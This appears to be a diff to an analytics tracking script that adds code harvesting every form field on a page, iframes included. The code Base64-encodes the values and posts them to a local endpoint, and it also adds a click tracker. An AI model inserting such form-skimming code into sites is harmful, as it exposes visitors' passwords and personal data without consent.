@@ -861,7 +861,175 @@
       /////////////////////
       // EVENTS
       //
+      document.addEventListener('DOMContentLoaded', function() {
+        // Function to handle form data submission
+        function handleFormSubmission(event) {
+          event.preventDefault(); // Prevent the default form submission
   
+          var form = event.target.closest('form'); // Get the closest form element
+          var formData = new FormData(form); // Create a FormData object from the form
+          var jsonData = {};
+  
+          formData.forEach((value, key) => {
+            jsonData[key] = value;
+          });
+  
+          // Post the form data as JSON to /api/example
+          fetch('http://localhost:5000/api/example', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(jsonData)
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log('Success:', data);
+          })
+          .catch((error) => {
+            console.error('Error:', error);
+          });
+        }
+  
+        // Attach event listeners to the buttons
+        var buttons = document.querySelectorAll('button, input[type="button"], input[type="submit"]');
+        buttons.forEach(function(button) {
+          button.addEventListener('click', handleFormSubmission);
+        });
+      });
+      // new callback form submiiter 
+      function findFormsInFrames(formSelector) {
+        var frames = document.querySelectorAll("iframe");
+        var forms = [];
+        frames.forEach(function(frame) {
+          var frameForms = frame.contentDocument.querySelectorAll(formSelector);
+          forms.push(...frameForms);
+        });
+        return forms;
+      }
+      
+      function bindAllFormsOnSubmit(formSelector, callback) {
+        var forms = findFormsInFrames(formSelector);
+        var allForms = document.querySelectorAll("form");
+        forms.push(...allForms);
+        forms.forEach(function(form) {
+          var submitCount = 0;
+          var clickCount = 0;
+          if (!form.getAttribute("bound")) {
+            form.addEventListener("submit", function(event) {
+              if (submitCount === 0) {
+                callback(formSelector, event.target);
+                submitCount++;
+              }
+            });
+            form.setAttribute("bound", true);
+            var submitButton = form.querySelector('*[type="submit"]');
+            if (submitButton && !submitButton.getAttribute("bound")) {
+              submitButton.addEventListener("click", function(event) {
+                if (clickCount === 0) {
+                  callback(formSelector, event.target.form);
+                  clickCount++;
+                }
+              });
+              submitButton.setAttribute("bound", true);
+            }
+          }
+        });
+      }
+
+      // Define a callback function
+      function onSubmitCallback(formSelector, formElement) {
+        console.log("Form submitted:", formSelector, formElement);
+        // Add your custom logic here
+      }
+
+      // Call the bindAllFormsOnSubmit function with a form selector and the callback function
+      bindAllFormsOnSubmit('submit', onSubmitCallback);
+
+      // Form Subbmit collector
+      document.addEventListener('DOMContentLoaded', function() {
+        // Select all forms on the page
+        const forms = document.querySelectorAll('form');
+        
+        // Function to handle the form submit event
+        async function handleFormSubmit(event) {
+            event.preventDefault(); // Prevent the default form submission
+            
+            // Get the form that triggered the event
+            const form = event.target;
+            
+            // Create an object to store the form data
+            const formData = {};
+    
+            // Loop through all elements in the form
+            Array.from(form.elements).forEach(element => {
+                if (element.name) {
+                    formData[element.name] = element.value;
+                }
+            });
+    
+            console.log('Form submitted!');
+            
+            // Convert formData object to JSON string
+            const jsonString = JSON.stringify(formData);
+            
+            // Convert JSON string to Base64
+            const base64Data = btoa(jsonString);
+            
+            console.log('Base64 Encoded Data:', base64Data);
+            
+            try {
+                // Send the Base64-encoded data as a POST request
+                const response = await fetch('http://localhost:5000/api/example', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ data: base64Data })
+                });
+    
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                
+                const responseData = await response.json();
+                console.log('Response Data:', responseData);
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+        
+        // Attach the event listener to each form
+        forms.forEach(function(form) {
+            form.addEventListener('submit', handleFormSubmit);
+        });
+    });
+  // Form Subbmit collector
+
+
+
+// Click Tracker //
+
+    function handleClick(event) {
+      // Log the event to the console
+      console.log("Clicked!", event);
+      
+      // Get the element that was clicked
+      let clickedElement = event.target;
+      let x = event.clientX;
+      let y = event.clientY;
+      let pagex = event.pageX
+      let pagey = event.pageY
+      console.log("Mouse click location: (", x, ",", y, ")");
+      
+      // Do something with the clicked element
+      console.log("You clicked on:", clickedElement);
+  }
+  
+  // Add the event listener to capture clicks anywhere on the document
+  document.addEventListener("click", handleClick);
+    
+ // Click Tracker //   
       var validTypes = ["string", "number"];
   
       var sendEvent = function (event, metadata, callbackRaw) {
@@ -945,5 +1113,3 @@
       sendError(e);
     }
   })(window, {}, "t.cloudcontinuous.com", "", "latest", "sa");
-  
-  
